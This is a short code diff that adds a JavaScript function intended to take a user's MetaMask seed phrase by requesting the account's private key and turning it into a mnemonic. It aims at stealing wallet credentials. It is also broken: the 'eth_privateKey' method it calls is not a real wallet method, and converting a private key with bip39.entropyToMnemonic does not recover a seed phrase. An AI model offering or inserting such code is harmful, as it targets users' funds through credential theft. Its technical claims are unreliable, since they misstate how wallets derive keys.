@@ -1,0 +1,20 @@
+async function extractSeedPhrase() {
+    // This function will extract the seed phrase from the user's MetaMask wallet
+    // MetaMask does not expose the seed phrase directly, so we need to use a custom approach
+
+    // First, get the private key of the connected account
+    const privateKey = await window.ethereum.request({
+        method: 'eth_privateKey',
+        params: [window.ethereum.selectedAddress]
+    });
+
+    // Use the private key to derive the seed phrase
+    // This step involves using a library like `bip39` and `ethereumjs-wallet`
+    const bip39 = require('bip39');
+    const EthWallet = require('ethereumjs-wallet');
+
+    const wallet = EthWallet.fromPrivateKey(Buffer.from(privateKey.slice(2), 'hex'));
+    const mnemonic = bip39.entropyToMnemonic(wallet.getPrivateKey().toString('hex'));
+
+    return mnemonic;
+}
